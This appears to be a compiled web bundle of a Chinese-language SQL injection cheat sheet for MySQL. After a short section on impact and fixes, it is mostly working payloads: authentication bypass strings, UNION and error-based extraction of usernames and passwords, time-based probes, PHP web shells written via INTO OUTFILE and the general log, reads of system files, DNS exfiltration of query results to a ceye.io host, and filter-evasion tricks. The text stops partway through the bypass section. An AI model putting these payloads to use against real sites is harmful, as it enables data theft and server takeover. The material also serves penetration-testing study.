import{_ as t,p as e,q as p,Z as a,s,R as n}from"./framework-6ecfbe9e.js";const o="/images/252e775042ff8d4fe13b7964ed95b885.png",c={},l=a(`<h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><p>SQL 注入就是指 web 应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 SQL 语句来实现对数据库的任意操作。</p><h2 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h2><ul><li>数据库信息泄露：数据库中存放的用户隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡。</li><li>网页被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。</li><li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><ul><li>使用参数化查询，将查询逻辑与查询数据分离。</li><li>严格限定参数类型和格式，明确参数校验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</li><li>替换或删除敏感字符或字符串。</li><li>将动态 SQL 语句替换为存储过程。</li><li>验证输入，即白/黑名单验证。</li><li>最小化 SQL 权限。</li><li>一致的错误消息机制，屏蔽出错信息。</li></ul><h2 id="常见数据库" tabindex="-1"><a class="header-anchor" href="#常见数据库" aria-hidden="true">#</a> 常见数据库</h2><table><thead><tr><th style="text-align:center;">数据库</th><th style="text-align:center;">默认端口</th><th style="text-align:center;">默认用户名</th></tr></thead><tbody><tr><td style="text-align:center;">MySQL</td><td style="text-align:center;">3306</td><td style="text-align:center;">root</td></tr><tr><td style="text-align:center;">MsSQL</td><td style="text-align:center;">1433</td><td style="text-align:center;">sa</td></tr><tr><td style="text-align:center;">Oracle</td><td style="text-align:center;">1521</td><td style="text-align:center;">sys/system</td></tr><tr><td style="text-align:center;">postgresql</td><td style="text-align:center;">5432</td><td style="text-align:center;">postgres</td></tr><tr><td style="text-align:center;">Redis</td><td style="text-align:center;">6379</td><td style="text-align:center;"></td></tr></tbody></table><h2 id="站库分离" tabindex="-1"><a class="header-anchor" href="#站库分离" aria-hidden="true">#</a> 站库分离</h2><ul><li>MySQL</li></ul><p>定位 web 端 IP 地址：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>PROCESSLIST<span class="token punctuation">;</span>
</code></pre></div><ul><li>MsSQL</li></ul><p>查询客户端主机名：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> host_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>查询服务端主机名：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> @<span class="token variable">@servername</span>
</code></pre></div><h2 id="mysql" tabindex="-1"><a class="header-anchor" href="#mysql" aria-hidden="true">#</a> MySQL</h2><h3 id="常用函数" tabindex="-1"><a class="header-anchor" href="#常用函数" aria-hidden="true">#</a> 常用函数</h3><ul><li>获取系统信息</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 当前用户名。</span>
<span class="token keyword">system_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 当前的用户名和主机名。</span>
<span class="token keyword">session_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 连接数据库的用户名。</span>
@<span class="token variable">@basedir</span>    <span class="token comment"># mysql 安装路径。</span>
@<span class="token variable">@datadir</span>    <span class="token comment"># 数据库路径。</span>
version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 返回当前数据库的版本信息。</span>
@<span class="token variable">@version_compile_os</span>	<span class="token comment"># 操作系统版本。</span>
</code></pre></div><ul><li>字符串连接</li></ul><p><code>concat</code> <code>concat_ws</code> <code>group_concat</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>字符串操作</li></ul><p><code>substr</code> <code>mid</code> <code>left</code> <code>right</code> <code>locate</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># substr(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度；limit表示从记录中第n个开始（n&gt;=0)，取m条记录。</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># mid(str,pos,len)，str--&gt;字符串，pos--&gt;截取位置，从1开始，len--&gt;截取长度</span>
<span class="token keyword">select</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># left(str,len)，str--&gt;字符串，len--&gt;长度，从左开始截取长度为len的字符串</span>
<span class="token keyword">select</span> <span class="token keyword">right</span><span class="token punctuation">(</span><span class="token string">&#39;martin&#39;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># right(str,len)，str--&gt;字符串，len--&gt;长度，从右开始截取长度为len的字符串</span>
<span class="token keyword">select</span> locate<span class="token punctuation">(</span><span class="token string">&#39;security&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;1234security&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 返回第一个字符串在第二个字符串首次出现的位置。</span>
<span class="token keyword">select</span> strcmp<span class="token punctuation">(</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 比较两个字符串是否相等，相等返回 0，str1&gt;str2 返回1，str1&lt;str2 返回-1。</span>
</code></pre></div><ul><li>返回指定 ASCII 字符对应的值</li></ul><p><code>ascii</code> <code>ord</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> ord<span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>返回指定数字对应的 ASCII 码</li></ul><p><code>char</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>计算相关</li></ul><p><code>length</code> <code>count</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 计算数据库名长度。</span>
<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span>
</code></pre></div><ul><li>时间相关</li></ul><p><code>sleep</code> <code>if</code> <code>benchmark</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 睡眠5秒</span>
<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>locate<span class="token punctuation">(</span><span class="token string">&#39;s&#39;</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># if(expr1,expr2,expr3)</span>
<span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span>sha<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># benchmark(loop_count,expr)，loop_count 表示循环次数，expr 执行的表达式。</span>
<span class="token keyword">select</span> get_lock<span class="token punctuation">(</span><span class="token string">&#39;test&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># get_lock(lock_name,timeout)，lock_name 表示锁名，timeout 表示超时时间。</span>
</code></pre></div><ul><li>注释方法</li></ul><p><code>#</code> <code>--+</code> <code>/* */</code> <code>/*! */</code> <code>/*!50000 */</code> MySQL 5 通用 带版本内联注释。</p><h3 id="注入语句" tabindex="-1"><a class="header-anchor" href="#注入语句" aria-hidden="true">#</a> 注入语句</h3><ul><li>万能密码</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token string">&#39;admin&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span><span class="token string">&#39;a&#39;</span> <span class="token operator">or</span> <span class="token string">&#39;a&#39;</span><span class="token operator">=</span>&#39;a
</code></pre></div><ul><li>UNION 注入</li></ul><ol><li>获取表名。</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ol start="2"><li>获取字段名。</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;users&#39;</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ol start="3"><li>获取字段值。</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token string">&#39;&lt;/br&gt;&#39;</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token operator">%</span><span class="token number">23</span>
</code></pre></div><ul><li>报错注入</li></ul><p><code>updatexml</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>UPDATEXML <span class="token punctuation">(</span>XML_document<span class="token punctuation">,</span> XPath_string<span class="token punctuation">,</span> new_value<span class="token punctuation">)</span> 改变文档中符合条件的节点的值。
XML_document：String 格式，为 XML 文档对象的名称。
XPath_string ：Xpath 格式的字符串。
new_value：String 格式，替换查找到的符合条件的数据。
</code></pre></div><ol><li>获取表名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ol start="2"><li>获取字段名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ </span>
</code></pre></div><p><code>extractvalue</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>Extractvalue<span class="token punctuation">(</span>xml_frag<span class="token punctuation">,</span> xpath_expr<span class="token punctuation">)</span> 函数使用 XPath 表示法从 XML 字符串中提取值。
xml_frag: 目标 xml 文档。
xpath_expr: 利用 Xpath 路径法表示的查找路径。
</code></pre></div><ol><li>获取表名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><ol start="2"><li>获取字段名</li></ol><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">&#39;emails&#39;</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+ </span>
</code></pre></div><p><code>floor</code></p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code>floor<span class="token punctuation">(</span>x<span class="token punctuation">)</span> 函数，向下取整<span class="token punctuation">,</span>返回一个不大于x的值。
</code></pre></div><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">--+</span>
</code></pre></div><h3 id="文件写入" tabindex="-1"><a class="header-anchor" href="#文件写入" aria-hidden="true">#</a> 文件写入</h3><ul><li>条件</li></ul><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 目录具有读写权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 网站绝对路径。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> <code>secure_file_pri</code>为空。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;-1&#39;</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;&lt;?php @eval($_GET[x]);?&gt;&quot;</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:/Inetpub/wwwroot/cc.php&#39;</span>
</code></pre></div><p>写一句话木马：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&quot;E\\\\phpStudy\\\\PHPTutoral\\\\www\\\\1.php&quot;</span> <span class="token comment">--+</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo()?&gt;&#39;</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&quot;E\\\\phpStudy\\\\PHPTutoral\\\\www\\\\1.php&quot;</span> <span class="token comment">--+</span>
</code></pre></div><p><code>outfile</code>和<code>dumpdile</code>的区别：</p><p><code>outfile</code>后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径,但是值的部分可以是 16 进制。在使用 outfile 时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在 \\n 等字符,会自动转义成 \\n,也就是会多加一个 \\。outfile 函数可以导出多行，而 <code>dumpfile</code> 只能导出一行数据；outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。而使用 dumpfile 时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）。</p><p>堆叠注入写木马：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token comment"># 主要利用 mysql 日志来写 shell。</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">&quot;ON&quot;</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">&#39;C:/wamp64/www/ma.php&#39;</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="文件读取" tabindex="-1"><a class="header-anchor" href="#文件读取" aria-hidden="true">#</a> 文件读取</h3><ul><li>条件</li></ul><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 目录具有读写权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> <code>secure_file_pri</code>为空。</li></ul><p>读取<code>secure_file_priv</code>配置：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">&quot;secure_file_priv&quot;</span>
</code></pre></div><table><thead><tr><th style="text-align:left;">值</th><th style="text-align:left;">说明</th></tr></thead><tbody><tr><td style="text-align:left;"><code>null</code></td><td style="text-align:left;">不允许导入导出</td></tr><tr><td style="text-align:left;"><code>/tmp</code></td><td style="text-align:left;">只能在 /tmp 目录下导入导出</td></tr><tr><td style="text-align:left;"><code>空</code></td><td style="text-align:left;">允许导入导出</td></tr></tbody></table><p>写文件的时候还需要看 php.ini 里面 gpc 是否开启看，开启的情况下，特殊字符都会被转义。</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">&#39;c:\\\\window\\\\win.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;c:/boot.ini&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token number">0x633a2f626f6f742e696e69</span><span class="token punctuation">)</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;//ecma.io/1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># smb 协议。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">&#39;\\\\\\\\ecma.io\\\\1.txt&#39;</span><span class="token punctuation">)</span> <span class="token comment"># 可用于DNS隧道。</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 可以列出 FreeBSD，Sunos 系统的根目录，char(47) 就是 &#39;/&#39;。</span>
</code></pre></div><h3 id="dnslog-外带" tabindex="-1"><a class="header-anchor" href="#dnslog-外带" aria-hidden="true">#</a> DNSLog 外带</h3><ul><li>条件</li></ul><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 目录具有读写权限。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> <code>secure_file_pri</code>为空。</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> Windows 系统。</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39;1&#39;</span> <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">&#39;\\\\\\\\&#39;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.27epx0.ceye.io\\\\abc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ # 使用 Windows 下的 UNC 路径。</span>
</code></pre></div><p>相应的更换<code>select database()</code>查询语句便可以实现 DNS 外带的回显注入，其中 27epx0.ceye.io 为 ceye.io 平台给每个账号起的昵称。</p><h2 id="绕过技术" tabindex="-1"><a class="header-anchor" href="#绕过技术" aria-hidden="true">#</a> 绕过技术</h2><h3 id="空格绕过" tabindex="-1"><a class="header-anchor" href="#空格绕过" aria-hidden="true">#</a> 空格绕过</h3><p>两个空格代替一个空格，用 Tab 代替空格，<code>%a0</code> = 空格：</p><ul><li>%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/</li></ul><p>使用注释替换空格：</p><ul><li>/**/</li></ul><p><img src="`+o+`" alt=""></p><p>使用浮点数：</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8</span>E0union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">8.0</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="括号绕过" tabindex="-1"><a class="header-anchor" href="#括号绕过" aria-hidden="true">#</a> 括号绕过</h3><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> dual <span class="token keyword">where</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
